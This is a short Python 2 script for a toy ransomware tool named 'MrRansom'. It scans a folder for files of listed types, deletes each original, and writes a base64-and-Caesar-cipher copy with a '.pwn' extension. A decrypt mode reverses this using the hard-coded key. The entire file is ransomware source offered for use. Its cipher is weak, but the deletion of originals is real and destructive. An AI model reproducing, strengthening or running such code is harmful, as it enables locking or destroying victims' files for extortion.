import base64
import os
import json
import argparse

from threading import Thread
from caeser import CaeserCipher


def put_file(content, file_name):
    with open(file_name, "w") as file_stream:
        file_stream.write(content)
        file_stream.close()


def get_file(file_name):
    with open(file_name, "rb") as file_stream:
        file_bytes = file_stream.read()
        file_stream.close()

    return file_bytes


def is_encrypted_file(filename):
    if filename.endswith(".pwn"):
        return True


def get_file_types():
    raw = json.loads(get_file("file_types.json"))

    return [file_type for file_type in raw["fileTypes"]]


VALID_FILE_TYPES = get_file_types()


def is_valid_file(filename):
    for file_type in VALID_FILE_TYPES:
        if filename.endswith(file_type) and not filename.startswith("."):
            return True


def get_files_to_encrypt(files):
    files_to_encrypt = []
    for file_name in files:
        if is_valid_file(file_name):
            files_to_encrypt.append(file_name)

    if len(files_to_encrypt) == 0:
        print "No supported files found"
        exit()

    return files_to_encrypt


def close_threads(workers):
    for thread in workers:
        thread.join()
        workers.remove(thread)


class MrRansom:

    def __init__(self, root_dir, key):
        self.key = key
        self.root_dir = root_dir
        self.workers = []

    def encrypt(self):
        files = os.listdir(self.root_dir)

        for file_name in get_files_to_encrypt(files):
            encrypt_thread = Thread(target=self.encrypt_file, args=(file_name, self.root_dir))
            self.workers.append(encrypt_thread)

            print "Encrypting: {}\n".format(file_name)
            encrypt_thread.start()

        close_threads(self.workers)

    def decrypt(self):
        files = os.listdir(self.root_dir)
        for file_name in files:
            if is_encrypted_file(file_name):
                decrypt_thread = Thread(target=self.decrypt_file, args=(file_name, self.root_dir))
                self.workers.append(decrypt_thread)

                print "Decrypting: {}\n".format(file_name)
                decrypt_thread.start()

        close_threads(self.workers)

    def encrypt_file(self, file_name, root_dir):
        file_bytes = get_file("{}/{}".format(root_dir, file_name))
        os.remove("{}/{}".format(root_dir, file_name))

        base64_file = base64.b64encode(file_bytes)
        encrypted = CaeserCipher(base64_file, self.key).encrypt()

        put_file(encrypted, "{}/{}.pwn".format(root_dir, file_name))

    def decrypt_file(self, file_name, root_dir):
        file_bytes = get_file("{}/{}".format(root_dir, file_name))

        decrypted = CaeserCipher(file_bytes, self.key).decrypt()
        put_file(base64.b64decode(decrypted), "{}/{}".format(self.root_dir, file_name.replace(".pwn", "")))

        os.remove("{}/{}".format(root_dir, file_name))


class EncryptAction(argparse.Action):

    def __init__(self, option_strings, dest, nargs=None, **kwargs):
        if nargs is not None:
            raise ValueError("nargs not allowed")
        super(EncryptAction, self).__init__(option_strings, dest, **kwargs)

    def __call__(self, parser, namespace, values, option_string=None):
        ransom = MrRansom("files", 15)

        if values == 'encrypt':
            ransom.encrypt()
        elif values == 'decrypt':
            ransom.decrypt()


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Mr. Ransom. Encrypts your precious files.')
    parser.add_argument('-mode', action=EncryptAction, help='Encrypt all the files')

    args = parser.parse_args()
